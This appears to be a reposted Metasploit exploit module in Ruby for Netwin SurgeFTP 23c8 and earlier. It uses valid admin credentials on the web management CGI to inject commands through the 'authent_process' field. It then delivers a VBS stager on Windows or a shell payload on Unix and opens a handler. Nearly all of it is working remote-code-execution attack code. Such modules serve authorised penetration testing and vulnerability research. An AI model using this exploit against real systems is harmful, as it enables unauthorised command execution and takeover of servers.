# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStagerVBS
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Netwin SurgeFTP Remote Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Netwin SurgeFTP, version 23c8
                or prior.  In order to execute commands via the FTP service, please note that
                you must have a valid credential to the web-based administrative console.
            },
            &#039;Author&#039;         =>
                [
                    &#039;Spencer McIntyre&#039;,  #Who found this vuln?
                    &#039;sinn3r&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;EDB&#039;, &#039;23522&#039;]
                ],
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows&#039;, { &#039;Arch&#039;=>ARCH_X86, &#039;Platform&#039;=>&#039;win&#039;}  ],
                    [ &#039;Unix&#039;,    { &#039;Arch&#039;=>ARCH_CMD, &#039;Platform&#039;=>&#039;unix&#039;, &#039;Payload&#039;=>{&#039;BadChars&#039; => "\x22"}} ]
                ],
            &#039;DisclosureDate&#039; => &#039;Dec 06 2012&#039;))
 
        register_options(
            [
                Opt::RPORT(7021),
                OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username with admin role to authenticate as&#039;, &#039;admin&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ true, &#039;The password for the specified username&#039;, &#039;password&#039; ])
            ], self.class)
    end
 
    def check
        res = send_request_raw({&#039;uri&#039;=>&#039;/cgi/surgeftpmgr.cgi&#039;})
        if res and res.body =~ /surgeftp\x20\x0d\x0a\x20\x20Manager CGI/
            return Exploit::CheckCode::Detected
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def execute_command(cmd, opts)
        http_send_command("cmd.exe /q /c #{cmd}")
    end
 
    def http_send_command(command)
        res = send_request_cgi(
        {
            &#039;uri&#039;     => &#039;/cgi/surgeftpmgr.cgi&#039;,
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;basic_auth&#039; => datastore[&#039;USERNAME&#039;] + ":" + datastore[&#039;PASSWORD&#039;],
            &#039;vars_post&#039; =>
                {
                    &#039;global_smtp&#039; => "",
                    &#039;global_restart&#039; => "",
                    &#039;global_style&#039; => "",
                    &#039;global_bind&#039; => "",
                    &#039;global_passive_ip&#039; => "",
                    &#039;global_passive_match&#039; => "",
                    &#039;global_logon_mode&#039; => "",
                    &#039;global_log_host&#039; => "",
                    &#039;global_login_error&#039; => "",
                    &#039;global_adminip&#039; => "",
                    &#039;global_total_users&#039; => "",
                    &#039;global_con_perip&#039; => "",
                    &#039;global_ssl&#039; => "",
                    &#039;global_ssl_cipher_list&#039; => "",
                    &#039;global_implicit_port&#039; => "",
                    &#039;log_level&#039; => "",
                    &#039;log_home&#039; => "",
                    &#039;global_watcher_program_ul&#039; => "",
                    &#039;global_watcher_program_dl&#039; => "",
                    &#039;authent_process&#039; => command,
                    &#039;authent_cmdopts&#039; => "",
                    &#039;authent_number&#039; => "",
                    &#039;authent_domain&#039; => "",
                    &#039;global_strip_user_domain&#039; => "",
                    &#039;global_noclass&#039; => "",
                    &#039;global_anon_hammer_over_time&#039; => "",
                    &#039;global_anon_hammer_max&#039; => "",
                    &#039;global_anon_hammer_block_time&#039; => "",
                    &#039;global_port&#039; => "",
                    &#039;global_mgr_port&#039; => "",
                    &#039;global_mgr_ssl_port&#039; => "",
                    &#039;cmd_global_save.x&#039; => "36",
                    &#039;cmd_global_save.y&#039; => "8",
                }
        })
 
        if res and res.body =~ /401 Authorization failed/
            fail_with(Exploit::Failure::NoAccess, "Unable to log in!")
        elsif not (res and res.code == 200)
            fail_with(Exploit::Failure::Unknown, &#039;Failed to execute command.&#039;)
        end
    end
 
    def exploit
        case target[&#039;Platform&#039;]
        when &#039;win&#039;
            print_status("#{rhost}:#{rport} - Sending VBS stager...")
            execute_cmdstager({:linemax=>500})
 
        when &#039;unix&#039;
            print_status("#{rhost}:#{rport} - Sending payload...")
            http_send_command(%Q|/bin/sh -c "#{payload.encoded}"|)
        end
 
        handler
    end
end

